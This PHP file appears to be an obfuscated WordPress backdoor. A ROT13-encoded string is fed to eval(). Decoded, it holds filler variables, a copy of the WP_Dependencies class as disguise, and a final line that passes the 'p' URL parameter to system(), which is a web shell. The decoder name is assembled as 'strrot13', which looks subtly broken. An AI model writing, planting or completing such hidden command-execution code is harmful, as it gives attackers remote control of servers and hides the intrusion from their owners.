<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qrcraqrapvrf NCV: JC_Qrcraqrapvrf onfr pynff
 *
 * @fvapr 2.6.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcraqrapvrf
 */

/**
 * Pber onfr pynff rkgraqrq gb ertvfgre vgrzf.
 *
 * @fvapr 2.6.0
 *
 * @frr _JC_Qrcraqrapl
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Qrcraqrapvrf {
	/**
	 * Na neenl bs nyy ertvfgrerq qrcraqrapvrf xrlrq ol unaqyr.
	 *
	 * @fvapr 2.6.8
	 *
	 * @ine _JC_Qrcraqrapl[]
	 */
	choyvp $ertvfgrerq = neenl();

	/**
	 * Na neenl bs unaqyrf bs dhrhrq qrcraqrapvrf.
	 *
	 * @fvapr 2.6.8
	 *
	 * @ine fgevat[]
	 */
	choyvp $dhrhr = neenl();

	/**
	 * Na neenl bs unaqyrf bs qrcraqrapvrf gb dhrhr.
	 *
	 * @fvapr 2.6.0
	 *
	 * @ine fgevat[]
	 */
	choyvp $gb_qb = neenl();

	/**
	 * Na neenl bs unaqyrf bs qrcraqrapvrf nyernql dhrhrq.
	 *
	 * @fvapr 2.6.0
	 *
	 * @ine fgevat[]
	 */
	choyvp $qbar = neenl();

	/**
	 * Na neenl bs nqqvgvbany nethzragf cnffrq jura n unaqyr vf ertvfgrerq.
	 *
	 * Nethzragf ner nccraqrq gb gur vgrz dhrel fgevat.
	 *
	 * @fvapr 2.6.0
	 *
	 * @ine neenl
	 */
	choyvp $netf = neenl();

	/**
	 * Na neenl bs qrcraqrapl tebhcf gb radhrhr.
	 *
	 * Rnpu ragel vf xrlrq ol unaqyr naq ercerfragf gur vagrtre tebhc yriry be obbyrna
	 * snyfr vs gur unaqyr unf ab tebhc.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine (vag|snyfr)[]
	 */
	choyvp $tebhcf = neenl();

	/**
	 * N unaqyr tebhc gb radhrhr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @qrcerpngrq 4.5.0
	 * @ine vag
	 */
	choyvp $tebhc = 0;

	/**
	 * Pnpurq ybbxhc neenl bs synggrarq dhrhrq vgrzf naq qrcraqrapvrf.
	 *
	 * @fvapr 5.4.0
	 *
	 * @ine neenl
	 */
	cevingr $nyy_dhrhrq_qrcf;

	/**
	 * Yvfg bs nffrgf radhrhrq orsber qrgnvyf jrer ertvfgrerq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @ine neenl
	 */
	cevingr $dhrhrq_orsber_ertvfgre = neenl();

	/**
	 * Cebprffrf gur vgrzf naq qrcraqrapvrf.
	 *
	 * Cebprffrf gur vgrzf cnffrq gb vg be gur dhrhr, naq gurve qrcraqrapvrf.
	 *
	 * @fvapr 2.6.0
	 * @fvapr 2.8.0 Nqqrq gur `$tebhc` cnenzrgre.
	 *
	 * @cnenz fgevat|fgevat[]|snyfr $unaqyrf Bcgvbany. Vgrzf gb or cebprffrq: dhrhr (snyfr),
	 *                                       fvatyr vgrz (fgevat), be zhygvcyr vgrzf (neenl bs fgevatf).
	 *                                       Qrsnhyg snyfr.
	 * @cnenz vag|snyfr             $tebhc   Bcgvbany. Tebhc yriry: yriry (vag), ab tebhc (snyfr).
	 * @erghea fgevat[] Neenl bs unaqyrf bs vgrzf gung unir orra cebprffrq.
	 */
	choyvp shapgvba qb_vgrzf( $unaqyrf = snyfr, $tebhc = snyfr ) {
		/*
		 * Vs abguvat vf cnffrq, cevag gur dhrhr. Vs n fgevat vf cnffrq,
		 * cevag gung vgrz. Vs na neenl vf cnffrq, cevag gubfr vgrzf.
		 */
		$unaqyrf = snyfr === $unaqyrf ? $guvf->dhrhr : (neenl) $unaqyrf;
		$guvf->nyy_qrcf( $unaqyrf );

		sbernpu ( $guvf->gb_qb nf $xrl => $unaqyr ) {
			vs ( ! va_neenl( $unaqyr, $guvf->qbar, gehr ) && vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
				/*
				 * Nggrzcg gb cebprff gur vgrz. Vs fhpprffshy,
				 * nqq gur unaqyr gb gur qbar neenl.
				 *
				 * Hafrg gur vgrz sebz gur gb_qb neenl.
				 */
				vs ( $guvf->qb_vgrz( $unaqyr, $tebhc ) ) {
					$guvf->qbar[] = $unaqyr;
				}

				hafrg( $guvf->gb_qb[ $xrl ] );
			}
		}

		erghea $guvf->qbar;
	}

	/**
	 * Cebprffrf n qrcraqrapl.
	 *
	 * @fvapr 2.6.0
	 * @fvapr 5.5.0 Nqqrq gur `$tebhc` cnenzrgre.
	 *
	 * @cnenz fgevat    $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz vag|snyfr $tebhc  Bcgvbany. Tebhc yriry: yriry (vag), ab tebhc (snyfr).
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr vs abg frg.
	 */
	choyvp shapgvba qb_vgrz( $unaqyr, $tebhc = snyfr ) {
		erghea vffrg( $guvf->ertvfgrerq[ $unaqyr ] );
	}

	/**
	 * Qrgrezvarf qrcraqrapvrf.
	 *
	 * Erphefviryl ohvyqf na neenl bs vgrzf gb cebprff gnxvat
	 * qrcraqrapvrf vagb nppbhag. Qbrf ABG pngpu vasvavgr ybbcf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 * @fvapr 2.8.0 Nqqrq gur `$tebhc` cnenzrgre.
	 *
	 * @cnenz fgevat|fgevat[] $unaqyrf   Vgrz unaqyr (fgevat) be vgrz unaqyrf (neenl bs fgevatf).
	 * @cnenz obby            $erphefvba Bcgvbany. Vagreany synt gung shapgvba vf pnyyvat vgfrys.
	 *                                   Qrsnhyg snyfr.
	 * @cnenz vag|snyfr       $tebhc     Bcgvbany. Tebhc yriry: yriry (vag), ab tebhc (snyfr).
	 *                                   Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba nyy_qrcf( $unaqyrf, $erphefvba = snyfr, $tebhc = snyfr ) {
		$unaqyrf = (neenl) $unaqyrf;
		vs ( ! $unaqyrf ) {
			erghea snyfr;
		}

		sbernpu ( $unaqyrf nf $unaqyr ) {
			$unaqyr_cnegf = rkcybqr( '?', $unaqyr );
			$unaqyr       = $unaqyr_cnegf[0];
			$dhrhrq       = va_neenl( $unaqyr, $guvf->gb_qb, gehr );

			vs ( va_neenl( $unaqyr, $guvf->qbar, gehr ) ) { // Nyernql qbar.
				pbagvahr;
			}

			$zbirq     = $guvf->frg_tebhc( $unaqyr, $erphefvba, $tebhc );
			$arj_tebhc = $guvf->tebhcf[ $unaqyr ];

			vs ( $dhrhrq && ! $zbirq ) { // Nyernql dhrhrq naq va gur evtug tebhc.
				pbagvahr;
			}

			$xrrc_tbvat = gehr;
			vs ( ! vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
				$xrrc_tbvat = snyfr; // Vgrz qbrfa'g rkvfg.
			} ryfrvs ( $guvf->ertvfgrerq[ $unaqyr ]->qrcf && neenl_qvss( $guvf->ertvfgrerq[ $unaqyr ]->qrcf, neenl_xrlf( $guvf->ertvfgrerq ) ) ) {
				$xrrc_tbvat = snyfr; // Vgrz erdhverf qrcraqrapvrf gung qba'g rkvfg.
			} ryfrvs ( $guvf->ertvfgrerq[ $unaqyr ]->qrcf && ! $guvf->nyy_qrcf( $guvf->ertvfgrerq[ $unaqyr ]->qrcf, gehr, $arj_tebhc ) ) {
				$xrrc_tbvat = snyfr; // Vgrz erdhverf qrcraqrapvrf gung qba'g rkvfg.
			}

			vs ( ! $xrrc_tbvat ) { // Rvgure vgrz be vgf qrcraqrapvrf qba'g rkvfg.
				vs ( $erphefvba ) {
					erghea snyfr; // Nobeg guvf oenapu.
				} ryfr {
					pbagvahr; // Jr'er ng gur gbc yriry. Zbir ba gb gur arkg bar.
				}
			}

			vs ( $dhrhrq ) { // Nyernql tenoorq vg naq vgf qrcraqrapvrf.
				pbagvahr;
			}

			vs ( vffrg( $unaqyr_cnegf[1] ) ) {
				$guvf->netf[ $unaqyr ] = $unaqyr_cnegf[1];
			}

			$guvf->gb_qb[] = $unaqyr;
		}

		erghea gehr;
	}

	/**
	 * Ertvfgre na vgrz.
	 *
	 * Ertvfgref gur vgrz vs ab vgrz bs gung anzr nyernql rkvfgf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 *
	 * @cnenz fgevat           $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz fgevat|snyfr     $fep    Shyy HEY bs gur vgrz, be cngu bs gur vgrz eryngvir
	 *                                 gb gur JbeqCerff ebbg qverpgbel. Vs fbhepr vf frg gb snyfr,
	 *                                 gur vgrz vf na nyvnf bs bgure vgrzf vg qrcraqf ba.
	 * @cnenz fgevat[]         $qrcf   Bcgvbany. Na neenl bs ertvfgrerq vgrz unaqyrf guvf vgrz qrcraqf ba.
	 *                                 Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat|obby|ahyy $ire    Bcgvbany. Fgevat fcrpvslvat vgrz irefvba ahzore, vs vg unf bar,
	 *                                 juvpu vf nqqrq gb gur HEY nf n dhrel fgevat sbe pnpur ohfgvat checbfrf.
	 *                                 Vs irefvba vf frg gb snyfr, n irefvba ahzore vf nhgbzngvpnyyl nqqrq
	 *                                 rdhny gb pheerag vafgnyyrq JbeqCerff irefvba.
	 *                                 Vs frg gb ahyy, ab irefvba vf nqqrq.
	 * @cnenz zvkrq            $netf   Bcgvbany. Phfgbz cebcregl bs gur vgrz. ABG gur pynff cebcregl $netf.
	 *                                 Rknzcyrf: $zrqvn, $va_sbbgre.
	 * @erghea obby Jurgure gur vgrz unf orra ertvfgrerq. Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba nqq( $unaqyr, $fep, $qrcf = neenl(), $ire = snyfr, $netf = ahyy ) {
		vs ( vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
			erghea snyfr;
		}
		$guvf->ertvfgrerq[ $unaqyr ] = arj _JC_Qrcraqrapl( $unaqyr, $fep, $qrcf, $ire, $netf );

		// Vs gur vgrz jnf radhrhrq orsber gur qrgnvyf jrer ertvfgrerq, radhrhr vg abj.
		vs ( neenl_xrl_rkvfgf( $unaqyr, $guvf->dhrhrq_orsber_ertvfgre ) ) {
			vs ( ! vf_ahyy( $guvf->dhrhrq_orsber_ertvfgre[ $unaqyr ] ) ) {
				$guvf->radhrhr( $unaqyr . '?' . $guvf->dhrhrq_orsber_ertvfgre[ $unaqyr ] );
			} ryfr {
				$guvf->radhrhr( $unaqyr );
			}

			hafrg( $guvf->dhrhrq_orsber_ertvfgre[ $unaqyr ] );
		}

		erghea gehr;
	}

	/**
	 * Nqq rkgen vgrz qngn.
	 *
	 * Nqqf qngn gb n ertvfgrerq vgrz.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz fgevat $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz fgevat $xrl    Gur qngn xrl.
	 * @cnenz zvkrq  $inyhr  Gur qngn inyhr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba nqq_qngn( $unaqyr, $xrl, $inyhr ) {
		vs ( ! vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
			erghea snyfr;
		}

		erghea $guvf->ertvfgrerq[ $unaqyr ]->nqq_qngn( $xrl, $inyhr );
	}

	/**
	 * Trg rkgen vgrz qngn.
	 *
	 * Trgf qngn nffbpvngrq jvgu n ertvfgrerq vgrz.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz fgevat $xrl    Gur qngn xrl.
	 * @erghea zvkrq Rkgen vgrz qngn (fgevat), snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_qngn( $unaqyr, $xrl ) {
		vs ( ! vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
			erghea snyfr;
		}

		vs ( ! vffrg( $guvf->ertvfgrerq[ $unaqyr ]->rkgen[ $xrl ] ) ) {
			erghea snyfr;
		}

		erghea $guvf->ertvfgrerq[ $unaqyr ]->rkgen[ $xrl ];
	}

	/**
	 * Ha-ertvfgre na vgrz be vgrzf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 *
	 * @cnenz fgevat|fgevat[] $unaqyrf Vgrz unaqyr (fgevat) be vgrz unaqyrf (neenl bs fgevatf).
	 */
	choyvp shapgvba erzbir( $unaqyrf ) {
		sbernpu ( (neenl) $unaqyrf nf $unaqyr ) {
			hafrg( $guvf->ertvfgrerq[ $unaqyr ] );
		}
	}

	/**
	 * Dhrhr na vgrz be vgrzf.
	 *
	 * Qrpbqrf unaqyrf naq nethzragf, gura dhrhrf unaqyrf naq fgberf
	 * nethzragf va gur pynff cebcregl $netf. Sbe rknzcyr va rkgraqvat
	 * pynffrf, $netf vf nccraqrq gb gur vgrz hey nf n dhrel fgevat.
	 * Abgr $netf vf ABG gur $netf cebcregl bs vgrzf va gur $ertvfgrerq neenl.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 *
	 * @cnenz fgevat|fgevat[] $unaqyrf Vgrz unaqyr (fgevat) be vgrz unaqyrf (neenl bs fgevatf).
	 */
	choyvp shapgvba radhrhr( $unaqyrf ) {
		sbernpu ( (neenl) $unaqyrf nf $unaqyr ) {
			$unaqyr = rkcybqr( '?', $unaqyr );

			vs ( ! va_neenl( $unaqyr[0], $guvf->dhrhr, gehr ) && vffrg( $guvf->ertvfgrerq[ $unaqyr[0] ] ) ) {
				$guvf->dhrhr[] = $unaqyr[0];

				// Erfrg nyy qrcraqrapvrf fb gurl zhfg or erpnyphyngrq va erphefr_qrcf().
				$guvf->nyy_dhrhrq_qrcf = ahyy;

				vs ( vffrg( $unaqyr[1] ) ) {
					$guvf->netf[ $unaqyr[0] ] = $unaqyr[1];
				}
			} ryfrvs ( ! vffrg( $guvf->ertvfgrerq[ $unaqyr[0] ] ) ) {
				$guvf->dhrhrq_orsber_ertvfgre[ $unaqyr[0] ] = ahyy; // $netf

				vs ( vffrg( $unaqyr[1] ) ) {
					$guvf->dhrhrq_orsber_ertvfgre[ $unaqyr[0] ] = $unaqyr[1];
				}
			}
		}
	}

	/**
	 * Qrdhrhr na vgrz be vgrzf.
	 *
	 * Qrpbqrf unaqyrf naq nethzragf, gura qrdhrhrf unaqyrf
	 * naq erzbirf nethzragf sebz gur pynff cebcregl $netf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 *
	 * @cnenz fgevat|fgevat[] $unaqyrf Vgrz unaqyr (fgevat) be vgrz unaqyrf (neenl bs fgevatf).
	 */
	choyvp shapgvba qrdhrhr( $unaqyrf ) {
		sbernpu ( (neenl) $unaqyrf nf $unaqyr ) {
			$unaqyr = rkcybqr( '?', $unaqyr );
			$xrl    = neenl_frnepu( $unaqyr[0], $guvf->dhrhr, gehr );

			vs ( snyfr !== $xrl ) {
				// Erfrg nyy qrcraqrapvrf fb gurl zhfg or erpnyphyngrq va erphefr_qrcf().
				$guvf->nyy_dhrhrq_qrcf = ahyy;

				hafrg( $guvf->dhrhr[ $xrl ] );
				hafrg( $guvf->netf[ $unaqyr[0] ] );
			} ryfrvs ( neenl_xrl_rkvfgf( $unaqyr[0], $guvf->dhrhrq_orsber_ertvfgre ) ) {
				hafrg( $guvf->dhrhrq_orsber_ertvfgre[ $unaqyr[0] ] );
			}
		}
	}

	/**
	 * Erphefviryl frnepu gur cnffrq qrcraqrapl gerr sbe n unaqyr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat[] $dhrhr  Na neenl bs dhrhrq _JC_Qrcraqrapl unaqyrf.
	 * @cnenz fgevat   $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @erghea obby Jurgure gur unaqyr vf sbhaq nsgre erphefviryl frnepuvat gur qrcraqrapl gerr.
	 */
	cebgrpgrq shapgvba erphefr_qrcf( $dhrhr, $unaqyr ) {
		vs ( vffrg( $guvf->nyy_dhrhrq_qrcf ) ) {
			erghea vffrg( $guvf->nyy_dhrhrq_qrcf[ $unaqyr ] );
		}

		$nyy_qrcf = neenl_svyy_xrlf( $dhrhr, gehr );
		$dhrhrf   = neenl();
		$qbar     = neenl();

		juvyr ( $dhrhr ) {
			sbernpu ( $dhrhr nf $dhrhrq ) {
				vs ( ! vffrg( $qbar[ $dhrhrq ] ) && vffrg( $guvf->ertvfgrerq[ $dhrhrq ] ) ) {
					$qrcf = $guvf->ertvfgrerq[ $dhrhrq ]->qrcf;
					vs ( $qrcf ) {
						$nyy_qrcf += neenl_svyy_xrlf( $qrcf, gehr );
						neenl_chfu( $dhrhrf, $qrcf );
					}
					$qbar[ $dhrhrq ] = gehr;
				}
			}
			$dhrhr = neenl_cbc( $dhrhrf );
		}

		$guvf->nyy_dhrhrq_qrcf = $nyy_qrcf;

		erghea vffrg( $guvf->nyy_dhrhrq_qrcf[ $unaqyr ] );
	}

	/**
	 * Dhrel gur yvfg sbe na vgrz.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 2.6.0 Zbirq sebz `JC_Fpevcgf`.
	 *
	 * @cnenz fgevat $unaqyr Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz fgevat $fgnghf Bcgvbany. Fgnghf bs gur vgrz gb dhrel. Qrsnhyg 'ertvfgrerq'.
	 * @erghea obby|_JC_Qrcraqrapl Sbhaq, be bowrpg Vgrz qngn.
	 */
	choyvp shapgvba dhrel( $unaqyr, $fgnghf = 'ertvfgrerq' ) {
		fjvgpu ( $fgnghf ) {
			pnfr 'ertvfgrerq':
			pnfr 'fpevcgf': // Onpx pbzcng.
				vs ( vffrg( $guvf->ertvfgrerq[ $unaqyr ] ) ) {
					erghea $guvf->ertvfgrerq[ $unaqyr ];
				}
				erghea snyfr;

			pnfr 'radhrhrq':
			pnfr 'dhrhr': // Onpx pbzcng.
				vs ( va_neenl( $unaqyr, $guvf->dhrhr, gehr ) ) {
					erghea gehr;
				}
				erghea $guvf->erphefr_qrcf( $guvf->dhrhr, $unaqyr );

			pnfr 'gb_qb':
			pnfr 'gb_cevag': // Onpx pbzcng.
				erghea va_neenl( $unaqyr, $guvf->gb_qb, gehr );

			pnfr 'qbar':
			pnfr 'cevagrq': // Onpx pbzcng.
				erghea va_neenl( $unaqyr, $guvf->qbar, gehr );
		}

		erghea snyfr;
	}

	/**
	 * Frg vgrz tebhc, hayrff nyernql va n ybjre tebhc.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat    $unaqyr    Anzr bs gur vgrz. Fubhyq or havdhr.
	 * @cnenz obby      $erphefvba Vagreany synt gung pnyyvat shapgvba jnf pnyyrq erphefviryl.
	 * @cnenz vag|snyfr $tebhc     Tebhc yriry: yriry (vag), ab tebhc (snyfr).
	 * @erghea obby Abg nyernql va gur tebhc be n ybjre tebhc.
	 */
	choyvp shapgvba frg_tebhc( $unaqyr, $erphefvba, $tebhc ) {
		$tebhc = (vag) $tebhc;

		vs ( vffrg( $guvf->tebhcf[ $unaqyr ] ) && $guvf->tebhcf[ $unaqyr ] <= $tebhc ) {
			erghea snyfr;
		}

		$guvf->tebhcf[ $unaqyr ] = $tebhc;

		erghea gehr;
	}

	/**
	 * Trg rgnt urnqre sbe pnpur inyvqngvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @tybony fgevat $jc_irefvba Gur JbeqCerff irefvba fgevat.
	 *
	 * @cnenz fgevat[] $ybnq Neenl bs fpevcg be fglyr unaqyrf gb ybnq.
	 * @erghea fgevat Rgnt urnqre.
	 */
	choyvp shapgvba trg_rgnt( $ybnq ) {
		/*
		 * Abgr: jc_trg_jc_irefvba() vf abg hfrq urer, nf guvf svyr pna or vapyhqrq
		 * ivn jc-nqzva/ybnq-fpevcgf.cuc be jc-nqzva/ybnq-fglyrf.cuc, va juvpu pnfr
		 * jc-vapyhqrf/shapgvbaf.cuc vf abg ybnqrq.
		 */
		tybony $jc_irefvba;

		$rgnt = \"JC:{$jc_irefvba};\";

		sbernpu ( $ybnq nf $unaqyr ) {
			vs ( ! neenl_xrl_rkvfgf( $unaqyr, $guvf->ertvfgrerq ) ) {
				pbagvahr;
			}

			$ire   = $guvf->ertvfgrerq[ $unaqyr ]->ire ?? $jc_irefvba;
			$rgnt .= \"{$unaqyr}:{$ire};\";
		}

		/*
		 * Guvf vf abg vagraqrq gb or pelcgbtencuvpnyyl frpher, whfg n snfg jnl gb trg
		 * n svkrq yratgu fgevat onfrq ba gur fpevcg irefvbaf. Nf guvf svyr qbrf abg
		 * ybnq gur shyy JbeqCerff raivebazrag, vg vf abg cbffvoyr gb hfr gur fnygrq
		 * jc_unfu() shapgvba.
		 */
		erghea 'J/\"' . zq5( $rgnt ) . '\"';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>